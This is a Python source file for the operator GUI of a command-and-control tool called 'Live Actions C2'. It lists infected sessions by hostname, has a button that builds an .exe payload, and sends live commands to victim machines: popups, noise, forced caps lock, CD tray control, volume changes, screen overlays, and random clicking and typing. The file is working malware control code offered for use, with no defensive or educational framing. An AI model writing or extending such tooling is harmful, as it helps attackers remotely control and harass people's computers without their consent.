import customtkinter as ctk
from tkinter import filedialog, messagebox
import requests
import threading
import time

# --- CONFIGURATION ---
C2_SERVER_URL = "http://127.0.0.1:5003"

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Live Actions C2")
        self.geometry("1024x600")

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        self.sessions = {}
        self.session_widgets = {}
        self.active_session_id = None

        # --- Frames ---
        self.home_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")
        self.home_frame.grid_columnconfigure(0, weight=1)
        self.home_frame.grid_rowconfigure(2, weight=1)

        self.session_detail_frame = ctk.CTkFrame(self, fg_color="transparent")
        
        self.setup_home_frame_widgets()
        self.start_polling()

    def setup_home_frame_widgets(self):
        """Sets up the initial screen with builder and session list."""
        builder_frame = ctk.CTkFrame(self.home_frame)
        builder_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="payload_name")
        self.payload_name_entry.pack(side="left", fill="x", expand=True, padx=5, pady=5)
        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.pack(side="left", padx=5, pady=5)
        
        self.sessions_label = ctk.CTkLabel(self.home_frame, text="Active Sessions (0)", font=ctk.CTkFont(weight="bold"))
        self.sessions_label.grid(row=1, column=0, padx=10, pady=(10, 0))

        self.sessions_frame = ctk.CTkScrollableFrame(self.home_frame, corner_radius=0)
        self.sessions_frame.grid(row=2, column=0, padx=10, pady=(0, 10), sticky="nsew")

    def start_polling(self):
        self.polling_active = True
        self.poll_thread = threading.Thread(target=self.poll_for_sessions, daemon=True)
        self.poll_thread.start()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def show_home_view(self):
        """Hides the detail view and shows the main session list."""
        self.active_session_id = None
        self.session_detail_frame.grid_forget()
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")

    def show_session_detail_view(self, session_id):
        """Shows the control panel for the selected session."""
        self.active_session_id = session_id
        session_data = self.sessions.get(session_id)
        if not session_data: return

        self.home_frame.grid_forget()
        
        # Clear previous widgets
        for widget in self.session_detail_frame.winfo_children():
            widget.destroy()
        
        self.session_detail_frame.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=10, pady=10)
        self.session_detail_frame.grid_columnconfigure(0, weight=1)
        self.session_detail_frame.grid_rowconfigure(1, weight=1)

        # Header
        header_frame = ctk.CTkFrame(self.session_detail_frame, fg_color="transparent")
        header_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        ctk.CTkButton(header_frame, text="< Back to Sessions", command=self.show_home_view).pack(side="left")
        ctk.CTkLabel(header_frame, text=f"Controlling: {session_data.get('hostname', 'N/A')}", font=ctk.CTkFont(size=16, weight="bold")).pack(side="left", padx=20)

        # Main control panel
        control_panel = ctk.CTkScrollableFrame(self.session_detail_frame)
        control_panel.grid(row=1, column=0, sticky="nsew")
        self.populate_control_panel(control_panel, session_id)

    def populate_control_panel(self, parent, session_id):
        """Creates all the buttons and sliders for the live actions."""
        # --- Popup Frame ---
        popup_frame = ctk.CTkFrame(parent); popup_frame.pack(fill="x", padx=10, pady=5)
        popup_frame.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(popup_frame, text="Custom Popup:").grid(row=0, column=0, padx=5, pady=5)
        popup_entry = ctk.CTkEntry(popup_frame, placeholder_text="Enter popup message..."); popup_entry.grid(row=0, column=1, sticky="ew")
        popup_button = ctk.CTkButton(popup_frame, text="Show", command=lambda: self.send_task("show_popup", {"message": popup_entry.get()}))
        popup_button.grid(row=0, column=2, padx=5)
        
        # --- Annoyance Frame ---
        annoy_frame = ctk.CTkFrame(parent); annoy_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkButton(annoy_frame, text="Toggle Noise", command=lambda: self.send_task("toggle_noise")).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(annoy_frame, text="Force Caps Lock", command=lambda: self.send_task("force_caps_lock")).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(annoy_frame, text="Open/Close CD Tray", command=lambda: self.send_task("open_cd_tray")).pack(side="left", padx=5, pady=5)

        # --- Volume Control ---
        vol_frame = ctk.CTkFrame(parent); vol_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(vol_frame, text="System Volume:").pack(side="left", padx=5)
        vol_slider = ctk.CTkSlider(vol_frame, from_=0, to=1, command=lambda v: self.send_task("set_volume", {"level": v}))
        vol_slider.pack(side="left", fill="x", expand=True, padx=5)
        vol_slider.set(1.0)

        # --- Overlay Frame ---
        overlay_frame = ctk.CTkFrame(parent); overlay_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(overlay_frame, text="Screen Overlay:").pack(side="left", padx=5)
        ctk.CTkButton(overlay_frame, text="Show Black", command=lambda: self.send_task("show_overlay", {"color": "black", "alpha": 0.7})).pack(side="left", padx=5)
        ctk.CTkButton(overlay_frame, text="Show Red", command=lambda: self.send_task("show_overlay", {"color": "red", "alpha": 0.4})).pack(side="left", padx=5)
        ctk.CTkButton(overlay_frame, text="Hide Overlay", command=lambda: self.send_task("hide_overlay")).pack(side="left", padx=5)
        
        # --- Input Simulation Frame ---
        input_frame = ctk.CTkFrame(parent); input_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkButton(input_frame, text="Toggle Random Clicking", command=lambda: self.send_task("toggle_random_clicking")).pack(side="left", padx=5, pady=5)
        ctk.CTkButton(input_frame, text="Toggle Random Typing", command=lambda: self.send_task("toggle_random_typing")).pack(side="left", padx=5, pady=5)

    def send_task(self, command, args={}):
        """Helper function to send a task to the active session."""
        if not self.active_session_id:
            messagebox.showwarning("Warning", "No active session selected.")
            return
        
        task_payload = {
            "session_id": self.active_session_id,
            "command": command,
            "args": args
        }
        
        try:
            response = requests.post(f"{C2_SERVER_URL}/api/task", json=task_payload, timeout=10)
            response.raise_for_status()
            print(f"Task '{command}' sent successfully.")
        except requests.exceptions.RequestException as e:
            messagebox.showerror("Error", f"Failed to send task: {e}")

    # --- Session Management (mostly unchanged) ---
    def on_closing(self):
        self.polling_active = False
        self.destroy()

    def poll_for_sessions(self):
        while self.polling_active:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/get_sessions", timeout=10)
                response.raise_for_status()
                self.after(0, self.update_gui_with_sessions, response.json())
            except requests.exceptions.RequestException: pass
            time.sleep(5)

    def update_gui_with_sessions(self, server_sessions):
        self.sessions_label.configure(text=f"Active Sessions ({len(server_sessions)})")
        current_session_ids = {s["session_id"] for s in server_sessions}
        
        for session_data in server_sessions:
            sid = session_data["session_id"]
            if sid not in self.sessions:
                self.sessions[sid] = session_data
                self.add_session_widget(sid, session_data["hostname"])
            
            is_active = (time.time() - session_data.get("last_seen", 0)) < 30
            self.session_widgets[sid].configure(fg_color="green" if is_active else "orange")
        
        for sid in list(self.sessions.keys()):
            if sid not in current_session_ids:
                self.session_widgets[sid].destroy()
                del self.session_widgets[sid]
                del self.sessions[sid]

    def add_session_widget(self, session_id, hostname):
        button = ctk.CTkButton(self.sessions_frame, text=f"{hostname}",
                               command=lambda s=session_id: self.show_session_detail_view(s))
        button.pack(fill="x", padx=5, pady=2)
        self.session_widgets[session_id] = button

    def build_payload_handler(self):
        payload_name = self.payload_name_entry.get()
        if not payload_name: messagebox.showerror("Error", "Payload name cannot be empty."); return
        output_dir = filedialog.askdirectory(title="Select Save Directory")
        if not output_dir: return
        
        self.build_button.configure(state="disabled", text="Building...")
        self.update_idletasks()
        
        threading.Thread(target=self._run_build, args=(C2_SERVER_URL, output_dir, payload_name), daemon=True).start()

    def _run_build(self, c2_url, output_dir, payload_name):
        success = build_payload(c2_url=c2_url, output_dir=output_dir, payload_name=payload_name)
        self.after(0, lambda: self.on_build_complete(success, payload_name))

    def on_build_complete(self, success, payload_name):
        if success: messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built!")
        else: messagebox.showerror("Build Failed", "Check console for details.")
        self.build_button.configure(state="normal", text="Build Payload")